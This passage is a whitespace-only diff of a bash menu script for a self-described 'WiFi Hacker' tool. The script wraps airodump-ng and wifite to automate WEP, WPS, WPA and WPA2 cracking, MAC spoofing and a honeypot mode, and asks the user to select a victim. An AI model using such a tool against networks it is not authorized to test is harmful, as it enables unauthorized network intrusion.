+	;;
 
-"S" | "s")
-checkForEmptyEncrytionType
+	"S" | "s")
+	checkForEmptyEncrytionType
 
-case "$bssid" in
+	case "$bssid" in
 
-"")
-menuMain
-;;
+	"")
+	menuMain
+	;;
 
-esac
+	esac
 
-if [ "$bssid" != "" ]; then
-menuSessionSave
-fi
-;;
+	if [ "$bssid" != "" ]; then
+	menuSessionSave
+	fi
+	;;
 
-"L" | "l")
-checkForEmptyEncrytionType
+	"L" | "l")
+	checkForEmptyEncrytionType
 
-#case "$bssid" in
+	#case "$bssid" in
 
-#"")
-#menuMain
-#;;
+	#"")
+	#menuMain
+	#;;
 
-#esac
+	#esac
 
-#if [ "$bssid" != "" ]; then
-menuSessionLoad
-#fi
-;;
+	#if [ "$bssid" != "" ]; then
+	menuSessionLoad
+	#fi
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-"Wifi")
-banner
-echo ""
-echo "YOU MUST DISCONNECT FROM WIFI BEFORE CONTINUING!!!!"
-echo ""
-echo ""
-echo "PRESS ENTER TO RETURN TO MAIN MENU...."
-echo ""
-echo ""
+	"Wifi")
+	banner
+	echo ""
+	echo "YOU MUST DISCONNECT FROM WIFI BEFORE CONTINUING!!!!"
+	echo ""
+	echo ""
+	echo "PRESS ENTER TO RETURN TO MAIN MENU...."
+	echo ""
+	echo ""
 
-read pause
+	read pause
 
-menuMain
-;;
+	menuMain
+	;;
 
-esac
+	esac
 
 }
 
 isUnreleased(){
 
-currentTask="isUnreleased"
-lastMenuID="isUnreleased"
+	currentTask="isUnreleased"
+	lastMenuID="isUnreleased"
 
-sessionCreatePaths
-sessionRemoveEmpty
+	sessionCreatePaths
+	sessionRemoveEmpty
 
-bannerMenu
+	bannerMenu
 
-echo ""
-echo "**********************************************************"
-echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
-echo "**********************************************************"
-echo ""
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
-echo ""
-echo "**********************************************************"
-echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
-echo "**********************************************************"
-echo ""
-echo ""
-echo ""
-echo "PLEASE PRESS "\""Y"\"" AND ENTER TO ACCEPT AND CONTINUE"
-echo ""
-echo ""
+	echo ""
+	echo "**********************************************************"
+	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
+	echo "**********************************************************"
+	echo ""
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
+	echo ""
+	echo "**********************************************************"
+	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
+	echo "**********************************************************"
+	echo ""
+	echo ""
+	echo ""
+	echo "PLEASE PRESS "\""Y"\"" AND ENTER TO ACCEPT AND CONTINUE"
+	echo ""
+	echo ""
 
-read agreeToDisclaimer
+	read agreeToDisclaimer
 
-case "$agreeToDisclaimer" in
+	case "$agreeToDisclaimer" in
 
-"")
-bannerExit
-;;
+	"")
+	bannerExit
+	;;
 
-"Y" | "y")
-fixNegativeOneChannelError
-startNetworkManager
-#killNetworkManager
-#killWpaSupplicant
-#initMonitorMode
-menuMain
-;;
+	"Y" | "y")
+	fixNegativeOneChannelError
+	startNetworkManager
+	#killNetworkManager
+	#killWpaSupplicant
+	#initMonitorMode
+	menuMain
+	;;
 
-*)
-bannerExit
-;;
+	*)
+	bannerExit
+	;;
 
-esac
+	esac
 
 }
 
@@ -1166,773 +1180,772 @@ esac
 
 menuMain(){
 
+	currentTask="menuMain"
+	lastMenuID="menuMain"
 
-currentTask="menuMain"
-lastMenuID="menuMain"
+	checkRootStatus
+	sessionCreatePaths
+	sessionRemoveEmpty
 
-checkRootStatus
-sessionCreatePaths
-sessionRemoveEmpty
+	# This double call to the below function fixes an issue with the ipStatusText not refreshing when returning to main menu from any option
+	checkConnectionStatus
+	checkConnectionStatus
 
-# This double call to the below function fixes an issue with the ipStatusText not refreshing when returning to main menu from any option
-checkConnectionStatus
-checkConnectionStatus
+	banner
 
-banner
+	echo ""
+	#echo "Welcome to the WiFi Hacker script!"
+	echo "Compatible with all WEP/WPA/WPA2/WPS protected WiFi routers."
+	echo ""
+	echo "**********************************************************************"
+	echo "YOU MUST DISCONNECT FROM ANY WIRELESS CONNECTIONS BEFORE CONTINUING!!!"
+	echo "**********************************************************************"
+	echo ""
+	echo "You are currently connected to: $ipStatusText"
+	echo ""
+	echo ""
+	echo "0) Full Automatic Mode (Applies To All Encryption Types)"
+	echo ""
+	echo "1) WEP Mode (Commands can be executed from a menu to easily circumvent any WEP connection)"
+	echo ""
+	echo "2) WPS Mode (May also have WPA, WPA2, or WEP displayed. Ignore this, as it has no effect on success rate)"
+	echo ""
+	echo "3) WPA Mode (Capture 4-way handshake, dictionary attack, bruteforce and others, VERY LOW SUCCESS RATE)"
+	echo ""
+	echo "4) WPA2 Mode (Almost identical to WPA attacks. This mode also carries a VERY LOW SUCCESS RATE)"
+	echo ""
+	echo ""
+	echo ""
+	echo "Select a mode from above and press Enter:"
+	echo ""
 
-echo ""
-#echo "Welcome to the WiFi Hacker script!"
-echo "Compatible with all WEP/WPA/WPA2/WPS protected WiFi routers."
-echo ""
-echo "**********************************************************************"
-echo "YOU MUST DISCONNECT FROM ANY WIRELESS CONNECTIONS BEFORE CONTINUING!!!"
-echo "**********************************************************************"
-echo ""
-echo "You are currently connected to: $ipStatusText"
-echo ""
-echo ""
-echo "0) Full Automatic Mode (Applies To All Encryption Types)"
-echo ""
-echo "1) WEP Mode (Commands can be executed from a menu to easily circumvent any WEP connection)"
-echo ""
-echo "2) WPS Mode (May also have WPA, WPA2, or WEP displayed. Ignore this, as it has no effect on success rate)"
-echo ""
-echo "3) WPA Mode (Capture 4-way handshake, dictionary attack, bruteforce and others, VERY LOW SUCCESS RATE)"
-echo ""
-echo "4) WPA2 Mode (Almost identical to WPA attacks. This mode also carries a VERY LOW SUCCESS RATE)"
-echo ""
-echo ""
-echo ""
-echo "Select a mode from above and press Enter:"
-echo ""
-
-read getMode
+	read getMode
 
 
-case "$getMode" in
+	case "$getMode" in
 
-"0")
-checkConnectionStatus
-checkWifiandDisplayMessage
-menuAttacksAllWifiteAuto
-menuMain
-;;
+	"0")
+	checkConnectionStatus
+	checkWifiandDisplayMessage
+	menuAttacksAllWifiteAuto
+	menuMain
+	;;
 
-"1")
-checkConnectionStatus
-checkWifiandDisplayMessage
-mkdir $capturePathWEP
-encryptionType="wep"
-encryptionTypeText="WEP"
-checkSpoofStatus
-menuAuto
-;;
+	"1")
+	checkConnectionStatus
+	checkWifiandDisplayMessage
+	mkdir $capturePathWEP
+	encryptionType="wep"
+	encryptionTypeText="WEP"
+	checkSpoofStatus
+	menuAuto
+	;;
 
-"2")
-checkConnectionStatus
-checkWifiandDisplayMessage
-mkdir $capturePathWPS
-encryptionType="wps"
-encryptionTypeText="WPS"
-checkSpoofStatus
-menuAuto
-;;
+	"2")
+	checkConnectionStatus
+	checkWifiandDisplayMessage
+	mkdir $capturePathWPS
+	encryptionType="wps"
+	encryptionTypeText="WPS"
+	checkSpoofStatus
+	menuAuto
+	;;
 
-"3")
-checkConnectionStatus
-checkWifiandDisplayMessage
-mkdir $capturePathWPA
-encryptionType="wpa"
-encryptionTypeText="WPA"
-checkSpoofStatus
-menuAuto
-;;
+	"3")
+	checkConnectionStatus
+	checkWifiandDisplayMessage
+	mkdir $capturePathWPA
+	encryptionType="wpa"
+	encryptionTypeText="WPA"
+	checkSpoofStatus
+	menuAuto
+	;;
 
-"4")
-checkConnectionStatus
-checkWifiandDisplayMessage
-mkdir $capturePathWPA2
-encryptionType="wpa2"
-encryptionTypeText="WPA2"
-checkSpoofStatus
-menuAuto
-;;
+	"4")
+	checkConnectionStatus
+	checkWifiandDisplayMessage
+	mkdir $capturePathWPA2
+	encryptionType="wpa2"
+	encryptionTypeText="WPA2"
+	checkSpoofStatus
+	menuAuto
+	;;
 
-"")
-menuMain
-;;
+	"")
+	menuMain
+	;;
 
-"M" | "m")
-menuMain
-;;
+	"M" | "m")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-checkForEmptyEncrytionType
+	"S" | "s")
+	checkForEmptyEncrytionType
 
-case "$bssid" in
+	case "$bssid" in
 
-"")
-menuMain
-;;
+	"")
+	menuMain
+	;;
 
-esac
+	esac
 
-if [ "$bssid" != "" ]; then
-menuSessionSave
-fi
-;;
+	if [ "$bssid" != "" ]; then
+	menuSessionSave
+	fi
+	;;
 
-"L" | "l")
-checkForEmptyEncrytionType
+	"L" | "l")
+	checkForEmptyEncrytionType
 
-#case "$bssid" in
+	#case "$bssid" in
 
-#"")
-#menuMain
-#;;
+	#"")
+	#menuMain
+	#;;
 
-#esac
+	#esac
 
-#if [ "$bssid" != "" ]; then
-menuSessionLoad
-#fi
-;;
+	#if [ "$bssid" != "" ]; then
+	menuSessionLoad
+	#fi
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-menuMain
-;;
+	*)
+	menuMain
+	;;
 
-esac
+	esac
 
 }
 
 
 menuAuto(){
 
-currentTask="menuAuto"
-lastMenuID="menuAuto"
+	currentTask="menuAuto"
+	lastMenuID="menuAuto"
 
-case "$encryptionTypeText" in
+	case "$encryptionTypeText" in
 
-"Empty")
-menuMain
-;;
+	"Empty")
+	menuMain
+	;;
 
-esac
+	esac
 
-#sessionCopyNewCaptureFiles
-sessionRemoveEmpty
+	#sessionCopyNewCaptureFiles
+	sessionRemoveEmpty
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "You are ready to begin the $encryptionTypeText attack!"
-echo ""
+	echo ""
+	echo "You are ready to begin the $encryptionTypeText attack!"
+	echo ""
 
-case "$encryptionTypeText" in
-"WEP")
-echo "To perform a fully automated attack, type AUTOWEP end press ENTER"
-;;
-esac
+	case "$encryptionTypeText" in
+	"WEP")
+	echo "To perform a fully automated attack, type AUTOWEP end press ENTER"
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPS")
-echo "To perform a fully automated attack, type AUTOWPS end press ENTER"
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPS")
+	echo "To perform a fully automated attack, type AUTOWPS end press ENTER"
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA")
-echo "To perform a fully automated attack, type AUTOWPA end press ENTER"
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA")
+	echo "To perform a fully automated attack, type AUTOWPA end press ENTER"
+	;;
+	esac
 
-case "$encryptionTypeText" in
-"WPA2")
-echo "To perform a fully automated attack, type AUTOWPA2 end press ENTER"
-;;
-esac
+	case "$encryptionTypeText" in
+	"WPA2")
+	echo "To perform a fully automated attack, type AUTOWPA2 end press ENTER"
+	;;
+	esac
 
-echo ""
-echo "YOU MAY NOW OPTIONALLY PRESS THE "\""W"\"" KEY ON KEYBOARD TO YOUR SPOOF MAC ADDRESS"
-echo ""
-echo ""
-echo ""
-echo "The next step will run an airodump-ng session in a new window."
-echo ""
-echo "Once you enter all required info, the new window will be closed"
-echo ""
-echo ""
-echo ""
-echo "Press ENTER to clear the current session and select a victim...."
-echo ""
-echo "YOU MAY ALSO PRESS THE "\""P"\"" KEY ON KEYBOARD TO LOAD PREVIOUS SESSION"
-echo ""
+	echo ""
+	echo "YOU MAY NOW OPTIONALLY PRESS THE "\""W"\"" KEY ON KEYBOARD TO YOUR SPOOF MAC ADDRESS"
+	echo ""
+	echo ""
+	echo ""
+	echo "The next step will run an airodump-ng session in a new window."
+	echo ""
+	echo "Once you enter all required info, the new window will be closed"
+	echo ""
+	echo ""
+	echo ""
+	echo "Press ENTER to clear the current session and select a victim...."
+	echo ""
+	echo "YOU MAY ALSO PRESS THE "\""P"\"" KEY ON KEYBOARD TO LOAD PREVIOUS SESSION"
+	echo ""
 
-read readyForAirodumpScan
+	read readyForAirodumpScan
 
-case "$readyForAirodumpScan" in
+	case "$readyForAirodumpScan" in
 
-"")
-killAll
-checkForEmptyEncrytionType
-autoModeNoPreviousSession
-;;
+	"")
+	killAll
+	checkForEmptyEncrytionType
+	autoModeNoPreviousSession
+	;;
 
-"P" | "p")
-checkForEmptyEncrytionType
+	"P" | "p")
+	checkForEmptyEncrytionType
 
-checkForEmptyBSSID
-checkForEmptyESSID
-checkForEmptyChannel
+	checkForEmptyBSSID
+	checkForEmptyESSID
+	checkForEmptyChannel
 
-autoModeUsePreviousSession
-;;
+	autoModeUsePreviousSession
+	;;
 
-"W" | "w")
-spoofMacAddress
-menuAuto
-;;
+	"W" | "w")
+	spoofMacAddress
+	menuAuto
+	;;
 
-"M" | "m")
-spoofStatus="0"
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	spoofStatus="0"
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-checkForEmptyEncrytionType
+	"S" | "s")
+	checkForEmptyEncrytionType
 
-case "$bssid" in
+	case "$bssid" in
 
-"")
-menuMain
-;;
+	"")
+	menuMain
+	;;
 
-esac
+	esac
 
-if [ "$bssid" != "" ]; then
-menuSessionSave
-fi
-;;
+	if [ "$bssid" != "" ]; then
+	menuSessionSave
+	fi
+	;;
 
-"L" | "l")
-checkForEmptyEncrytionType
+	"L" | "l")
+	checkForEmptyEncrytionType
 
-#case "$bssid" in
+	#case "$bssid" in
 
-#"")
-#menuMain
-#;;
+	#"")
+	#menuMain
+	#;;
 
-#esac
+	#esac
 
-#if [ "$bssid" != "" ]; then
-menuSessionLoad
-#fi
-;;
+	#if [ "$bssid" != "" ]; then
+	menuSessionLoad
+	#fi
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-"autowep" | "AUTOWEP" | "AutoWEP" | "AutoWep" | "autoWEP" | "autoWep")
-menuAttacksWEPWifiteAuto
-;;
+	"autowep" | "AUTOWEP" | "AutoWEP" | "AutoWep" | "autoWEP" | "autoWep")
+	menuAttacksWEPWifiteAuto
+	;;
 
-"autowps" | "AUTOWPS" | "AutoWPS" | "AutoWps" | "autoWPS" | "autoWps")
-menuAttacksWPSWifiteAuto
-;;
+	"autowps" | "AUTOWPS" | "AutoWPS" | "AutoWps" | "autoWPS" | "autoWps")
+	menuAttacksWPSWifiteAuto
+	;;
 
-"autowpa" | "AUTOWPA" | "AutoWPA" | "AutoWpa" | "autoWPA" | "autoWpa")
-menuAttacksWPAWifiteAuto
-;;
+	"autowpa" | "AUTOWPA" | "AutoWPA" | "AutoWpa" | "autoWPA" | "autoWpa")
+	menuAttacksWPAWifiteAuto
+	;;
 
-"autowpa2" | "AUTOWPA2" | "AutoWPA2" | "AutoWpa2" | "autoWPA2" | "autoWpa2")
-menuAttacksWPA2WifiteAuto
-;;
+	"autowpa2" | "AUTOWPA2" | "AutoWPA2" | "AutoWpa2" | "autoWPA2" | "autoWpa2")
+	menuAttacksWPA2WifiteAuto
+	;;
 
-*)
+	*)
 
-menuAuto
+	menuAuto
 
-;;
+	;;
 
-esac
+	esac
 
-#restartProcesses
+	#restartProcesses
 
-menuMain
+	menuMain
 
 }
 
 
 menuAdvanced(){
 
-currentTask="menuAdvanced"
-#lastMenuID="menuAdvanced"
+	currentTask="menuAdvanced"
+	#lastMenuID="menuAdvanced"
 
-interface="None"
+	interface="None"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "SORRY I GOT LAZY AND NEVER CODED THIS MENU"
-echo "WILL BE AVAILABLE SOOOOOOOOOON!"
-echo ""
-echo ""
-echo "Advanced Menu"
-echo ""
-echo ""
-echo "1) Monitor Mode Options"
-echo ""
-echo "2) Honeypot Mode and Attacks"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Select an option and press ENTER:"
-echo ""
-echo ""
+	echo ""
+	echo "SORRY I GOT LAZY AND NEVER CODED THIS MENU"
+	echo "WILL BE AVAILABLE SOOOOOOOOOON!"
+	echo ""
+	echo ""
+	echo "Advanced Menu"
+	echo ""
+	echo ""
+	echo "1) Monitor Mode Options"
+	echo ""
+	echo "2) Honeypot Mode and Attacks"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Select an option and press ENTER:"
+	echo ""
+	echo ""
 
-read getAdvancedOptionMain
+	read getAdvancedOptionMain
 
-case "$getAdvancedOptionMain" in
+	case "$getAdvancedOptionMain" in
 
-"")
-$lastMenuID
-#menuMain
-#menuAdvanced
-;;
+	"")
+	$lastMenuID
+	#menuMain
+	#menuAdvanced
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-$lastMenuID
-#menuMain
-#menuAdvanced
-;;
+	*)
+	$lastMenuID
+	#menuMain
+	#menuAdvanced
+	;;
 
-esac
+	esac
 
-#restartProcesses
+	#restartProcesses
 
-$lastMenuID
+	$lastMenuID
 
 }
 
 
 menuExtras(){
 
-currentTask="menuExtras"
-#lastMenuID="menuExtras"
+	currentTask="menuExtras"
+	#lastMenuID="menuExtras"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "1) Backup All Sessions and Capture Files (Full Backup of all saved files to ZIP file)"
-echo "2) Clean Capture Files (Removes all saved .cap, .xor, .ivs, .csv, and .netxml files)"
-echo "3) Clean Session Files (Removes all saved WEP, WPS, WPA, WPA2 *.sessions files)"
-echo ""
-echo "4) Change Active Terminal (Switch between Gnome, Konsole, X-Term, and User Selected)"
-echo ""
-echo "5) Start NetworkManager"
-echo "6) Stop NetworkManager"
-echo "7) Stop wpa_supplicant"
-echo "8) Stop wpa_cli"
-echo "9) Enable Channel Hopping On $interface"
-echo "0) Disable Channel Hopping On $interface"
-echo ""
-echo "R) Return To Previous Menu"
-echo ""
-echo ""
-echo "Select an option from above and press ENTER:"
-echo ""
-echo ""
+	echo ""
+	echo "1) Backup All Sessions and Capture Files (Full Backup of all saved files to ZIP file)"
+	echo "2) Clean Capture Files (Removes all saved .cap, .xor, .ivs, .csv, and .netxml files)"
+	echo "3) Clean Session Files (Removes all saved WEP, WPS, WPA, WPA2 *.sessions files)"
+	echo ""
+	echo "4) Change Active Terminal (Switch between Gnome, Konsole, X-Term, and User Selected)"
+	echo ""
+	echo "5) Start NetworkManager"
+	echo "6) Stop NetworkManager"
+	echo "7) Stop wpa_supplicant"
+	echo "8) Stop wpa_cli"
+	echo "9) Enable Channel Hopping On $interface"
+	echo "0) Disable Channel Hopping On $interface"
+	echo ""
+	echo "R) Return To Previous Menu"
+	echo ""
+	echo ""
+	echo "Select an option from above and press ENTER:"
+	echo ""
+	echo ""
 
-read getExtras
+	read getExtras
 
-case "$getExtras" in
+	case "$getExtras" in
 
-"")
-menuExtras
-;;
+	"")
+	menuExtras
+	;;
 
-"1")
-backupSessionFiles
-;;
+	"1")
+	backupSessionFiles
+	;;
 
-"2")
-cleanCaptureFiles
-;;
+	"2")
+	cleanCaptureFiles
+	;;
 
-"3")
-cleanSessionFiles
-;;
+	"3")
+	cleanSessionFiles
+	;;
 
-"4")
-menuChangeTerminal
-;;
+	"4")
+	menuChangeTerminal
+	;;
 
-"5")
-startNetworkManager
-;;
+	"5")
+	startNetworkManager
+	;;
 
-"6")
-killNetworkManager
-;;
+	"6")
+	killNetworkManager
+	;;
 
-"7")
-wpa_supplicant stop
-;;
+	"7")
+	wpa_supplicant stop
+	;;
 
-"8")
-wpa_cli terminate
-;;
+	"8")
+	wpa_cli terminate
+	;;
 
-"9")
-enableChannelHopping
-;;
+	"9")
+	enableChannelHopping
+	;;
 
-"0")
-disableChannelHopping
-;;
+	"0")
+	disableChannelHopping
+	;;
 
-"r" | "R")
-$lastMenuID
-;;
+	"r" | "R")
+	$lastMenuID
+	;;
 
-"M" | "m")
-menuMain
-;;
+	"M" | "m")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-menuExtras
-;;
+	*)
+	menuExtras
+	;;
 
-esac
+	esac
 
-menuExtras
+	menuExtras
 
 }
 
 
 menuHelp(){
 
-currentTask="menuHelp"
-#lastMenuID="menuHelp"
+	currentTask="menuHelp"
+	#lastMenuID="menuHelp"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "*******************************************"
-echo "CURENTLY NOT WORKING!!!"
-echo ""
-echo "PRESS ENTER TO RETURN TO PREVIOUS MENU!"
-echo "*******************************************"
-echo ""
-echo ""
-echo ""
-echo "Welcome to the Help Section!"
-echo ""
-echo ""
-echo ""
-echo "CURRENTLY NOT AVAILABLE!"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
+	echo ""
+	echo "*******************************************"
+	echo "CURENTLY NOT WORKING!!!"
+	echo ""
+	echo "PRESS ENTER TO RETURN TO PREVIOUS MENU!"
+	echo "*******************************************"
+	echo ""
+	echo ""
+	echo ""
+	echo "Welcome to the Help Section!"
+	echo ""
+	echo ""
+	echo ""
+	echo "CURRENTLY NOT AVAILABLE!"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
 
-read getHelp
+	read getHelp
 
-case "$getHelp" in
+	case "$getHelp" in
 
-"")
-$lastMenuID
-#menuMain
-#menuHelp
-;;
+	"")
+	$lastMenuID
+	#menuMain
+	#menuHelp
+	;;
 
-"M" | "m")
-menuMain
-;;
+	"M" | "m")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-$lastMenuID
-#menuMain
-#menuHelp
-;;
+	*)
+	$lastMenuID
+	#menuMain
+	#menuHelp
+	;;
 
-esac
+	esac
 
-$lastMenuID
+	$lastMenuID
 
 }
 
 
 menuChangeTerminal(){
 
-currentTask="menuChangeTerminal"
-#lastMenuID="menuChangeTerminal"
+	currentTask="menuChangeTerminal"
+	#lastMenuID="menuChangeTerminal"
 
-banner
+	banner
 
 
-echo ""
-echo "Select a new terminal to use"
-echo ""
-echo ""
-echo "Current Terminal: $terminal"
-echo ""
-echo ""
-echo "1) Gnome: $terminalGnome"
-echo ""
-echo "2) Konsole: $terminalKonsole"
-echo ""
-echo "3) X-Term: $terminalXterm"
-echo ""
-echo "4) Custom (User Selected)"
-echo ""
-echo "5) Return To Previous Menu"
-echo ""
-echo ""
+	echo ""
+	echo "Select a new terminal to use"
+	echo ""
+	echo ""
+	echo "Current Terminal: $terminal"
+	echo ""
+	echo ""
+	echo "1) Gnome: $terminalGnome"
+	echo ""
+	echo "2) Konsole: $terminalKonsole"
+	echo ""
+	echo "3) X-Term: $terminalXterm"
+	echo ""
+	echo "4) Custom (User Selected)"
+	echo ""
+	echo "5) Return To Previous Menu"
+	echo ""
+	echo ""
 
-read getTerminalType
+	read getTerminalType
 
-case "$getTerminalType" in
+	case "$getTerminalType" in
 
-"")
-menuChangeTerminal
-;;
+	"")
+	menuChangeTerminal
+	;;
 
-"1")
-terminal="$terminalGnome"
-terminalText="Gnome"
-;;
+	"1")
+	terminal="$terminalGnome"
+	terminalText="Gnome"
+	;;
 
-"2")
-terminal="$terminalKonsole"
-terminalText="Konsole"
-;;
+	"2")
+	terminal="$terminalKonsole"
+	terminalText="Konsole"
+	;;
 
-"3")
-terminal="$terminalXterm"
-terminalText="Xterm"
-;;
+	"3")
+	terminal="$terminalXterm"
+	terminalText="Xterm"
+	;;
 
-"4")
-banner
-echo ""
-echo "Input a terminal string with arguments and press ENTER:"
-echo ""
-echo ""
-echo "Example: $terminalGnome"
-echo ""
-echo ""
+	"4")
+	banner
+	echo ""
+	echo "Input a terminal string with arguments and press ENTER:"
+	echo ""
+	echo ""
+	echo "Example: $terminalGnome"
+	echo ""
+	echo ""
 
-read newTerminal
+	read newTerminal
 
-case "$newTerminal" in
+	case "$newTerminal" in
 
-*)
-terminal="$newTerminal"
-terminalText="Custom"
-;;
+	*)
+	terminal="$newTerminal"
+	terminalText="Custom"
+	;;
 
-esac
+	esac
 
-;;
+	;;
 
-"5")
-menuExtras
-;;
+	"5")
+	menuExtras
+	;;
 
-"M" | "m")
-menuMain
-;;
+	"M" | "m")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-menuChangeTerminal
-;;
+	*)
+	menuChangeTerminal
+	;;
 
-esac
+	esac
 
-menuMain
+	menuMain
 
 }
 
